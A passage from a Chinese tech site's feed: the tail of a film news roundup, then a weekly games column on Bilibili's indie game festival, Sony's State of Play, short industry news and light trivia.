新剧《同情者》。该剧改编自越南裔美国小说家阮清越获普利策奖的同名作品，讲述了一个潜伏于南越的北越间谍的故事。</p>\n<h3>北京电影节正式公布「合力生光」主题海报</h3>\n<p>7 月 15 日，北京电影节海报正式公布，主海报以「合力生光」为主题，首批片单动画单元有宫崎骏《红猪》、《高达 SEED 系列》，修复单元有《教父 3》、《阮玲玉》、《胭脂扣》4K 修复版，时间为 8 月 14 日至 8 月 21 日。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/16/article/2cd105893269b263cbd1423d3ed7117a\"></figure><h3>更多</h3>\n<p><strong>东野圭吾小说《沉默的游行》将于 2022 年在日本上映：</strong>据悉，电影已于 7 月上旬开机，预计 9 月初杀青， 本片是《神探伽利略》电影版续作，由本福山雅治、柴咲幸、北村一辉回归主演。值得一提的是，这是继《嫌疑人X的献身》（2008）和《盛夏的方程式》（2013）后，第三部《神探伽利略》系列改编电影。</p>\n<p><strong>全明星主演 Netflix 黑色喜剧片《Don't Look Up》定档 12 月：</strong>本片由莱昂纳多·迪卡普里奥、詹妮弗·劳伦斯、梅丽尔·斯特里普、凯特·布兰切特、提莫西·查拉梅、罗布·摩根等主演。影片讲述了两位水平不高的天文学家发现即将有颗陨石毁灭地球，筹备了一场声势浩大的发布会做说明却没有人相信的故事。</p>\n<p><strong>电影版《轮到你了》12 月 10 日日本上映：</strong>日剧《轮到你了》剧场版发布全新海报，并宣布将于 12 月 10 日在日本上映。故事讲述电视剧版世界的平行故事，秋元康担任企划及原案，原田知世、田中圭等原班人马回归出演。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/67746"},{"title":"瞎玩菌的游戏周报：高能电玩节、State of Play 等","date":"2021-07-16 08:01:02","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.7.16 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>资讯</h2>\n<h3>B 站高能电玩节助推国产独立游戏，Steam 专题页面开启免费试玩</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/40c21023b142e86c3a6c28cefbddb1ca.png\"></figure><p>B 站 <a href=\"https://www.bilibili.com/blackboard/activity-M93QK68C0I.html\">高能电玩节</a> 从 7 月 9 日到 14 日带来了 30 款独立游戏的首发情报和试玩。</p>\n<p>官方的《高能独立游戏夜》全程回顾视频可以到 <a href=\"https://www.bilibili.com/video/BV1oh411h7Kb\">这里</a> 观看，总时长 1 小时 4 分。</p> <p>「太长不看」的玩家可以直接跳转到 <a href=\"https://store.steampowered.com/sale/game_charging_fest?l=schinese\">Steam 专题页面</a>，直接下载试玩自己感兴趣的游戏 demo，或者是加入愿望单。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/92da0100dbbc04d03bd615318fb8e6cb.png\"></figure><p>由于游戏众多，无法一一介绍，瞎玩菌将选取其中值得注意的游戏进行概述。</p>\n<p>这次展出的游戏中有不少恐怖游戏，为了照顾大家的眼睛，我就不放出游戏画面了。</p>\n<ul>\n<li>《<a href=\"https://store.steampowered.com/app/1120810/_/\">斩妖行</a>》正式版上线，提供免费试玩版，目前特别好评（好评率 81.5%）。瞎玩菌曾经在核聚变的 B 站发行专区玩过早期版本，当时觉得体验还不错，就是难度偏硬核，不适合所有人。</li>\n<li>《波西亚时光》的续作《<a href=\"https://store.steampowered.com/app/1084600?snr=1_614_615_gamechargingfest_100703\">沙石镇时光</a>》的预告片中展示了游戏内的种植，节日与战斗系统。瞎玩菌在 6 月的 Steam 新品节玩过这款游戏，喜欢慢节奏建造玩法的玩家可以试试看。</li>\n<li>国产独立恐怖游戏《<a href=\"https://store.steampowered.com/app/1602300?snr=1_614_615_gamechargingfest_100703\">人窟日记</a>》，部分灵感取材自鲁迅的作品，融合了社会元素和年代感，并包含文学隐喻。开发者是狗猫鼠工作室。</li>\n<li>VR 互动电影《<a href=\"https://store.steampowered.com/app/1523370/AD_2047/\">A.D. 2047</a>》充满中国元素，但配音有违和感，有的玩家不喜欢。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/30681d612f808a75baecf2aa4a5df5ef.jpg\"><figcaption>《光明记忆 无限》</figcaption></figure><ul>\n<li>《<a href=\"https://store.steampowered.com/app/1178830?snr=1_614_615_gamechargingfest_100703\">光明记忆：无限</a>》放出新的 <a href=\"https://www.bilibili.com/video/BV1jM4y1M7cD\">演示预告片</a>。视频中展示了每一把武器的特殊开火模式和游戏后期的一段 BOSS 战斗演示。游戏预计在 2021 年内发售，登陆 PC / XSX|S 平台，PS5 平台将在晚些登陆。</li>\n<li>2D 漫画风动作游戏《<a href=\"https://store.steampowered.com/app/1406850?snr=1_614_615_gamechargingfest_100703\">廖添丁</a>》，讲的是台湾人民抗日的故事，瞎玩菌在 Steam 新品节玩过这个游戏，感觉像在玩抗日神剧。</li>\n<li>《<a href=\"https://store.steampowered.com/app/1654130?snr=1_614_615_gamechargingfest_100703\">孙美琪疑案：雨儿胡同</a>》发布了首个 <a href=\"https://www.bilibili.com/video/BV1zK4y1M7wF\">预告片</a>，这是一款悬疑推理类游戏，有点恐怖。《孙美琪疑案》系列的视频在 B 站一直很火，推荐从未接触过这个系列的玩家观看 Up 主@逍遥散人 的 <a href=\"https://www.bilibili.com/video/BV197411Z7PE\">游戏视频</a>。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/0b9eb43865e01f28af0c671504402431.gif\"><figcaption>《文字游戏》里的龙</figcaption></figure><ul><li>独树一帜的冒险解谜游戏《<a href=\"https://store.steampowered.com/app/1109570?snr=1_614_615_gamechargingfest_100703\">文字游戏</a>》，游戏名字非常直白，画面全部由纯文字组成。由于这个原因，游戏对硬件配置的要求极低，再差的显卡都能玩，而且是高能电玩节中为数不多支持 Mac 设备的游戏。瞎玩菌对这个游戏高度感兴趣。这游戏不懂中文是不是没法玩？万一火了老外要求出外语版本怎么办？</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/566fd32be4d2348a99424b988ca179ae.jpg\"><figcaption>《骇游侠探》</figcaption></figure><ul><li>赛博朋克 RPG《<a href=\"https://store.steampowered.com/app/917720?snr=1_614_615_gamechargingfest_100703\">骇游侠探</a>》，提供免费试玩版。你是一位在虚拟世界里探案的骇游侠探。你需要巧用智慧，从目击证人和嫌疑人身上收集情报，揭开谎言与阴谋的真相。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/a7243a43ea65f377346d45ecb2296de6.gif\"><figcaption>《劲爆 51 飞行队》</figcaption></figure><ul><li>清版射击游戏《<a href=\"https://store.steampowered.com/app/1378800/Squadron_51/\">劲爆 51 飞行队</a>》射爆一切！老少咸宜！支持本地双人合作模式，第 2 名玩家可以中途随时加入游戏。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/312b73942df1ccc9d42dd50a0bd67afb.gif\"><figcaption>关闭光线追踪后出现了小姐姐的 jio</figcaption></figure><ul><li>《<a href=\"https://store.steampowered.com/app/1543030?snr=1_614_615_gamechargingfest_100703\">仙剑奇侠传 7</a>》公布了光线追踪实录演示视频（<a href=\"https://www.youtube.com/watch?v=lGO6M7joVxM\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1yK4y1M7v7\">哔哩哔哩</a>）。</li></ul> <p> </p>\n<p>限于篇幅和瞎玩菌个人的精力有限，无法把所有游戏覆盖到，欢迎玩家朋友们继续补充和点评。</p>\n<p>很多独立游戏开发者为了宣传自己的游戏，游戏的制作人甚至亲自在 B 站当了 Up 主，发布自己游戏的视频来吸引玩家，他们也出现在了这次的高能电玩节中，他们同样很值得关注：</p>\n<ul>\n<li>@<a href=\"https://space.bilibili.com/15105608\">夜神说话</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV13w411f7wX\">拯救大魔王 2：逆流</a>》</li>\n<li>@<a href=\"https://space.bilibili.com/7796661\">压缩文渐</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV15q4y1L73C\">互联网原住民</a>》</li>\n<li>@<a href=\"https://space.bilibili.com/7686012\">踢踢打踢踢</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV1tg411g76H\">微光之镜</a>》</li>\n<li>@<a href=\"https://space.bilibili.com/4878171\">离忧先生</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV1fa4y1E7e9\">剑魄</a>》</li>\n<li>@<a href=\"https://space.bilibili.com/629159152\">羲和工作室</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV16T4y1P75u\">言出法随</a>》</li>\n<li>@<a href=\"https://space.bilibili.com/580207\">AliveGameStudio</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV1L44y1z7d5\">原石计划</a>》</li>\n<li>@<a href=\"https://space.bilibili.com/31078113\">亚恒_AkabaStudio</a> 的游戏《<a href=\"https://www.bilibili.com/video/BV1cW411y7DH\">拣爱</a>》</li>\n</ul>\n<p>总体来说 B 站的这个高能电玩节，喜欢独立游戏且支持国产游戏发展的玩家应该会很喜欢，而某些只玩 3A 大作/手游/车枪球等主流游戏的玩家不一定很感兴趣。</p>\n<p>从瞎玩菌的视角来看，非常高兴看到 B 站能从游戏发行方的身份往外又跨出了一步，借助自身视频平台的优势资源，帮了独立游戏一把。这里面当然有 B 站自己发行的游戏（例如《斩妖行》），但更多是其他开发者、发行商的游戏，B 站还特邀了多位知名 Up 主制作这些游戏的视频。让瞎玩菌没想到的是，B 站甚至联动了 Steam，让玩家试玩游戏更加方便。</p>\n<p>希望高能电玩节能像国际上的其他游戏节和发布会那样越来越火，取得越来越高的关注度。「高能电玩节」的名字取自 B 站弹幕常见的「前方高能」，而且这个名字没有把内容局限在独立游戏上，也许在未来，我们真能看到顶级大作在高能电玩节上露面，就像 E3、TGA 一样有排面。但即使不往主流方向发展，保持推荐独立游戏的定位也很好。</p>\n<h3>State of Play 公布《暗影火炬城》《死亡搁浅 导演剪辑版》《死亡循环》等 11 款游戏的信息</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/14/56e20494791beaf47b4dd76c9d32d4ec.jpg\"></figure><p>在 7 月 9 日的索尼 State of Play 直播活动（<a href=\"https://www.youtube.com/watch?v=Sm8a4OC6W3A\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1jh41167Th\">哔哩哔哩</a>）上，多款 PS4 / PS5 和跨平台游戏公布了新信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/9622fd6b9c143978b74531b33d1951f4.gif\"><figcaption>柴油朋克风格的《暗影火炬城》</figcaption></figure><p>PlayStation 「<a href=\"https://asia.playstation.com.cn/chs-cn/hero/\">中国之星计划</a>」第二期入选的游戏《暗影火炬城》（F.I.S.T. Forged in Shadow Torch）同时也出现在了 B 站的高能电玩节活动中。这款游戏来自来自上海钛核，将于今年 9 月 7 日登陆 PS4、PS5 和 PC 平台（商店链接：<a href=\"https://store.playstation.com/zh-hans-hk/product/HP6808-CUSA28373_00-PS4FISTASIAHK004\">PSN 商店</a> | <a href=\"https://store.steampowered.com/app/1330470/_/\">Steam</a>）。游戏采用虚幻 4 引擎打造，力求 3D 写实主义的顶级视觉表现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/91b8f6a39812e7190ced617635a0a26f.png\"><figcaption>《死亡搁浅 导演剪辑版》新增货物发射机</figcaption></figure><p>《死亡搁浅 导演剪辑版》（Death Stranding: Director’s Cut）严格来说名字并不恰当，就连导演小岛秀夫自己都不喜欢这个名字。因为首先这款游戏没有「剪」掉任何内容，反而新增了不少内容，例如货物发射机、支撑骨架、伙伴机器人、跳跃坡道等，甚至加入了非常乱来的「竞速赛道」新玩法（下图）。游戏是为 PS5 重制的版本，叫做重制版（Remastered）应该更合适一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/fdb32006776b92e812b681d6e14dfb9c.png\"></figure><p>这款游戏将于今年 9 月 24 日登陆 PS5，并且支持在 PS5 性能模式下以 4K + 60fps 游玩。跟《对马岛之鬼 导演剪辑版》一样，老玩家需要付费升级——拥有《死亡搁浅》PS4 原版的玩家，需要花费 10 美元升级到《死亡搁浅 导演剪辑版》。</p>\n<p>按照索尼的尿性，瞎玩菌预计不久后就能看到这个版本登陆 PC 平台吧。前段时间刚刚在 Epic 游戏商城大促时花 45 元购买了《死亡搁浅》的玩家们不妨等等看 PC 版的升级方案。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/7a69c33e43bf855db419f9d53f3e7c11.jpeg\"></figure><p>微软第一方游戏《死亡循环》（Deathloop）将由 PS5 平台独占一年（注：指的是仅在主机平台独占），游戏还是会首发登陆 PC 平台，你可以在 9 月 14 日玩到这款游戏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/000085450a97f7fc3805f856522db5d4.png\"><figcaption>打破《死亡循环》</figcaption></figure><p>这款游戏是本次 State of Play 直播的压轴介绍内容，索尼播了一个时长接近 10 分钟的游戏玩法演示视频（<a href=\"https://www.youtube.com/watch?v=kTnzLC6Utk0\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV13M4y1M7ZV\">哔哩哔哩</a>）。从演示内容来看，喜欢《羞辱》系列的玩家很可能会同样喜欢上这款华丽暗杀玩法的游戏。即使玩法上有些相似性，但这款游戏拥有一种独特的上世纪 60 年代间谍惊悚片视觉风格。</p> <p>玩家在游戏里扮演一名叫做 Colt 的刺客，主角拥有传送、用意念扔东西和时间倒流的超能力。他还被另一个名叫 Julianna 的刺客追踪——她可以由另一个入侵的玩家或传统的 AI 控制。</p>\n<p>这场 State of Play 介绍的其他游戏还有：</p>\n<ul>\n<li>PS VR 游戏《Moss: Book II》</li>\n<li>多人射击游戏《Arcadegeddon》</li>\n<li>荒野生存游戏《Tribes of Midgard》</li>\n<li>8 月 PS+ 会免游戏《猎人竞技场：传奇》（Hunter's Arena: Legends）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/1f67ded3ebd6575ccaa7c5d8f307957a.png\"><figcaption>《师父》（Sifu）</figcaption></figure><ul>\n<li>中国风武打动作游戏《师父》（Sifu）公布了新预告片（<a href=\"https://www.youtube.com/watch?v=Vy-enf5xxgQ\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1164y1b76a\">哔哩哔哩</a>），延期到 2022 年发售</li>\n<li>《超级兄弟：剑与巫术 EP》（Superbrothers: Sword &amp; Sworcery EP）开发者的新作《JETT : The Far Shore》不再是魔幻题材，而是科幻题材</li>\n<li>热门动漫改编游戏《鬼灭之刃 火神血风谭》（Demon Slayer: The Hinokami Chronicles）</li>\n<li>《审判之逝：凐灭的记忆》（Lost Judgement）9 月 24 日发售</li>\n</ul>\n<p>这场 State of Play 直播就像官方预告的一样，没有《战神》新作，没有《地平线：西部禁域》，也没有下一代 PS VR 设备的消息，但不失为一场有料的发布会。最让某些玩家失望的大概是没有他们期待已久的《最终幻想 16》，这群玩家在社交网络上用「小丑竟是我自己」表达了他们的感想。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/e990596297455564fa49337696f2fd23.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/4fbcb441b4d152a5b490014e457783ca.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/5b4e3341b260950e22af22e4ad81b7cc.png\"></figure><p>所以《最终幻想 7 重制版 第 2 章》什么时候出？</p>\n<h3>尽量一句话新闻</h3>\n<p>「尽量一句话新闻」是为了控制游戏周报的篇幅，并保持足够的信息量。大部分时候瞎玩菌尽量用一句话浓缩信息，也可能不止一句话。感兴趣的读者可以点击每条新闻末尾的链接符号 🔗 以了解更多信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/99238575acb0d28381d5b923daf7e659.jpeg\"><figcaption>图源 <a href=\"https://www.thegamer.com/apple-vs-epic-australia/\">The Gamer RHIANNON BEVAN</a></figcaption></figure><ul>\n<li>Epic 在澳洲上诉苹果违反澳大利亚竞争法被受理，吃瓜群众们的第二季要来了？ <a href=\"https://www.thegamer.com/apple-vs-epic-australia/\">🔗</a>\n</li>\n<li>市场监管总局依法禁止虎牙公司与斗鱼国际控股有限公司合并。理由是合并会强化腾讯在游戏直播市场的支配地位，有违《反垄断法》第二十八条和《经营者集中审查暂行规定》第三十五条规定。 <a href=\"http://www.samr.gov.cn/xw/zj/202107/t20210710_332525.html\">🔗</a>\n</li>\n<li>Android 12 新增边下边玩、游戏仪表盘和 3 档游戏模式 API。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/254f494b590f90ae3efdfee33d3dbbfd.jpg\"></figure><ul>\n<li>国行版 Switch 现已支持微博分享功能，玩家可一次分享最多 9 张游戏截图（必须来自同一款游戏）或 1 个游戏视频。腾讯能不能给任天堂说一下，我有一位美国/香港/日本的朋友也想分享到微博。 <a href=\"https://weibo.com/7229718199/KnLEtFPGw\">🔗</a>\n</li>\n<li>Gamesbeat 编辑 Jeff Grubb 爆料，传说中有性能升级的 Switch Pro 有可能在 2022 年发布。你看，狼又来了。 <a href=\"https://venturebeat.com/2021/07/06/switch-oled-was-predictable-and-fits-nintendos-strategy/\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/403a8e935a29dd0b3ae3f21633e66f8a.jpg\"><figcaption>xScreen</figcaption></figure><ul><li>Xbox Series S 的一款便携显示屏「xScreen」正在众筹中（上图），然而某宝已经在卖 Xbox Series X 的便携显示屏（下图）。瞎玩菌好奇，真有人觉得这样「便携」吗？ <a href=\"https://www.kickstarter.com/projects/xscreen/xscreen-for-xbox-series-s/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/15/037a30206eb17cb1f3ba275bf4b3f4e8.jpg\"><figcaption>图源 <a href=\"https://m.tb.cn/h.4xHf1sY\">淘宝</a></figcaption></figure><ul><li>《赛博朋克 2077》重回 PlayStation 商店后销售相当火热，甚至登上美国、加拿大和欧洲的 PS4 销量榜第一名。 <a href=\"https://www.forbes.com/sites/paultassi/2021/07/10/cyberpunk-2077-is-topping-ps4-sales-charts-with-no-help-from-sony/?sh=4c3767c54a4d\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/f88ed8eacb14aebf32436303691a1b80.png\"><figcaption>《女神异闻录》25 周年</figcaption></figure><ul>\n<li>《女神异闻录》25 周年官网搞事，暗示 7 款新企划。官网宣称，目前《女神异闻录》系列销量已经突破 1500 万份，感谢玩家们的支持。盲猜这里面应该有《女神异闻录 6》吧？ <a href=\"http://p-ch.jp/p25th/\">🔗</a>\n</li>\n<li>《贪玩蓝月》开发商江西贪玩公司使用「古剑奇谭」购买百度搜索关键词推广，吃官司败诉。北京市海淀区人民法院判定该行为属于不正当竞争，并判决赔偿给上海烛龙信息科技有限公司共 26 万元。 <a href=\"https://www.bjcourt.gov.cn/cpws/paperView.htm?id=100944464668&amp;n=1\">🔗</a>\n</li>\n<li>特斯拉 X 吃鸡手游国际服联动，特斯拉的 Gigafactory 工厂、Model Y 汽车和 Semi 皮卡车将整合进游戏的 v1.5 版本中（<a href=\"https://www.youtube.com/watch?v=TYM_dwIuKcE\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1fv411H7o2\">哔哩哔哩</a>）。玩家可以在 Gigafactory 工厂的流水线上现场组装一辆 Model Y，还可以驾驶特斯拉的车辆并使用自动驾驶（autopilot）模式，自动前往预设位置。注意这里说的吃鸡手游指的是《PUBG Mobile》，不是《和平精英》。 <a href=\"https://electrek.co/2021/07/12/tesla-partners-pubg-new-video-game-integration/\">🔗</a>\n</li>\n<li>一共 4 集的 Netflix 动画剧集《生化危机：无尽黑暗》（Resident Evil: Infinite Darkness）上线，玩家/观众口碑崩盘，豆瓣评分仅 4.9 分（5128 人评价）。豆友短评说这部剧「全程尿点」。 <a href=\"https://movie.douban.com/subject/35211362/\">🔗</a>\n</li>\n<li>COD 惊现深度学习外挂。这种外挂通过采集卡来采集游戏画面，不破解和修改游戏本身，适用于任意主机和 PC 平台。深度学习系统分析细微动作和特定武器，找出敌人位置，并自动瞄准和开枪。目前动视已经关闭了宣传外挂的 Youtube 频道，但没有很好的办法来识别和打击这种外挂。 <a href=\"https://twitter.com/AntiCheatPD/status/1412024189561851904\" target=\"_blank\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/b71bcae8b60cd02ae6fbc0b9b605ae85.jpeg\"></figure><ul><li>综合评分网站 Metacritics 公布上半年高分游戏排行榜，共 20 名。前 5 名分别是：《漫野奇谭》（Wildermyth）90 分，《超级马力欧 3D 世界 + 库巴之怒》89 分，《瑞奇与叮当 时空跳转》88 分，《怪物猎人 崛起》88 分，《双人成行》88 分。 <a href=\"https://www.metacritic.com/pictures/best-games-of-2021-at-midyear/17\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/3e28d21913c16bc4ef277059d2f5ea04.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/e0f46bb4e01b8836e280a14a0e4b8110.jpg\"></figure><ul>\n<li>国产游戏《亿万恋人》上架 Steam 后好评如潮，玩家称之为「反诈先锋」。游戏中玩家扮演一个刚毕业的贫穷大学生，某天神秘的富豪叔叔忽然给你的银行账户转了一个亿。然后你身边出现了四个风格各异的帅哥…… <a href=\"https://store.steampowered.com/app/1578860/_/\">🔗</a>\n</li>\n<li>《荒野大镖客 2》现已实装 DLSS，4K 分辨率下性能提升多达 45%。 <a href=\"https://www.nvidia.com/en-us/geforce/news/red-dead-redemption-2-nvidia-dlss-upgrade-out-now/\">🔗</a>\n</li>\n<li>《Among Us》更新 2021.6.30 版本，支持简繁中文。 <a href=\"https://twitter.com/amongusgame/status/1412807528057036802\">🔗</a>\n</li>\n<li>《蜡笔小新 我与博士的暑假~无尽的七日之旅~》已于 7 月 15 日发售，上架日服 eshop（末尾链接为商店页面）。但由于暂不支持中文，且售价高达 6580 日元（约合人民币 387.18 元），瞎玩菌不推荐购买。但官方放出的游戏美术壁纸品质很不错，瞎玩菌精选 2 张具有夏日气息的壁纸在下面，更多壁纸可以访问 <a href=\"https://game.neoscorp.jp/shinchan/special.html\">游戏官网</a> 自行下载。 <a href=\"https://store-jp.nintendo.com/list/software/70010000037406.html\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/40d30cc18308ee893b9b6318117de65f.jpeg\"><figcaption>横屏壁纸</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/7039cd06eda2fdb7041a963886dc7299.jpeg\"><figcaption>竖屏壁纸</figcaption></figure><ul>\n<li>育碧确认将开发大型线上游戏项目《刺客信条：无限》（Assassin’s Creed Infinity）。 <a href=\"https://news.ubisoft.com/en-us/article/GZi5hT4dBeM8YITOsJeCn/an-update-on-assassins-creed-infinity-and-the-future-of-the-assassins-creed-franchise\">🔗</a>\n</li>\n<li>暗黑风 ARPG《惩戒魅魔》 7 月 15 日发布 V0.770 更新，加入了一些新姿势（不是谐音梗，就是字面意思上的姿势），还有新玩家宫殿和新武器。目前游戏在 Steam 中国区促销中，售价 32 元（-41%），到 7 月 25 日截止。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/c70a2ce85b63b5e6af96c082267b444e.jpeg\"></figure><ul><li>译林出版社的新书《岩田先生：任天堂传奇社长如是说》正式出版。本书取材于HOBO日刊ITOI新闻所刊载的岩田聪访谈，以及任天堂官网上登出的《向社长询问》栏目，将「岩田先生本人的话」按照时间、主题的顺序，重新编排，汇集成册。 <a href=\"https://weibo.com/1647172887/Ko9s7nEF3\">🔗</a>\n</li></ul>\n<h2>彩蛋</h2>\n<p>「彩蛋」版块旨在分享有趣或有料的游戏相关内容，但不是严肃的游戏新闻。内容来源不限于玩家社群，MOD，二创，同人或 ACG 衍生的亚文化等。</p>\n<h3>🌈🥚1 《城市：天际线》的一名 95 后玩家在游戏里建了一个广州</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/87508836e3c6b73fe1e9d2c348def6f8.jpg\"><figcaption>图源 <a href=\"https://weibo.com/2810373291/KnYk582qb\">微博 新华网</a></figcaption></figure><p>霍凯扬是一名广州的 3D 场景地编设计师，他根据现实中见到的样子，亲手打造了一个 <a href=\"https://www.bilibili.com/video/BV17y4y1J7r8\">游戏中的广州</a>。游戏逼真地还原了珠江新城、广州塔、江湾大桥等地标。该事件最近受到 <a href=\"https://weibo.com/2810373291/KnYk582qb\">新华网</a> 报道，并登上微博热搜。</p> <p>霍凯扬还是一名学霸，在 2015 年的高考结束后，霍凯扬率先走出考场并接受采访说：「如果爱情能有英语那么简单就好了」，当时也曾登上微博热搜。最终霍凯扬英语得 141 分，总分 645 分，全省理科排名 5067 名，但他对分数不太满意。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/ceb5ccde7c9d0b3857b3f8c3fa7a63c1.jpg\"><figcaption>名场面。图源 广东新闻台《新闻最前线》</figcaption></figure><p>如果《城市：天际线》能有霍凯扬玩得这么简单就好了。</p>\n<h3>🌈🥚2 财富密码：中国留学生在日本帮人修改塞尔达存档，年入千万日元</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/6ab5164585d2981d4209f62a8ac06d12.jpg\"><figcaption>犯罪证据</figcaption></figure><p>27 岁的中国籍留学生蒋一民因修改 Switch 存档数据，在日本被新泻县警方逮捕。居住在东京丰岛区的蒋一民从 2019 年 12 月开始在网上自称「最强修改」，向每位玩家收费 3500 日元修改《塞尔达传说：旷野之息》的存档，然后花 500 日元成本找淘宝店修改存档，自己只是当二道贩子，就这样一年半时间挣了超过 1000 万日元。这一「跨国」大案因涉嫌违反日本《反不正当竞争法》，正在被新泻县警察进一步调查。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/ed11896e73c730a9404ffa279168c9ad.jpg\"></figure><p>来源 <a href=\"https://www.ohbsn.com/news/detail/kennai20210708_15575245.php\">1</a>、<a href=\"https://www.dexerto.com/legend-of-zelda/zelda-hacker-arrested-for-selling-illegal-breath-of-the-wild-save-files-1609437/\">2</a>、<a href=\"https://twitter.com/zonghengjp/status/1413091395053580290\">3</a>、<a href=\"http://i.jandan.net/p/109251\">4</a></p>\n<p>从年龄来看，蒋一民应该是 94 后，跟前一位 95 后青年年龄差不多，但做的事情咋就差别这么大呢？</p>\n<h3>🌈🥚3 索尼在一个广告视频中放反了 PS5，随后尴尬删除</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/ba5bd616556f29efd5c6d5c851798993.jpg\"><figcaption>图源 <a href=\"https://www.reddit.com/r/PS5/comments/ogaleu/humor_sony_ad_has_the_ps5_upside_down_at_the_26/h4hw4gp/\">reddit madhouse5625</a></figcaption></figure><p>PS5 光驱版的正确横放方向如下图所示（光驱口朝下）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/dfd29e79bd1cd8880f5036a4ea74e095.png\"><figcaption>图源 <a href=\"https://www.playstation.com/zh-hans-hk/ps5/ps5-entertainment/\">PlayStation 官网</a></figcaption></figure><p>说实话我也记不住正反，玩家朋友们，你们一般是竖着放吗？</p>\n<h3>🌈🥚4 <a href=\"https://www.microsoft.com/en-us/microsoft-teams/background-blur?ocid=oo_support_mix_marvel_ups_support_smcteam_inline&amp;rtc=1#coreui-heading-vscefb9\">微软</a> 放出了 Windows 内置经典游戏《空当接龙》（Solitaire）等多款壁纸</h3>\n<p>目的是便于大家在 Microsoft Teams 的视频会议中当做背景使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/e0f184ec78044cc5bf1d84298508fc3f.jpg\"></figure><figure class=\"image ss-img-wrapper\"><img 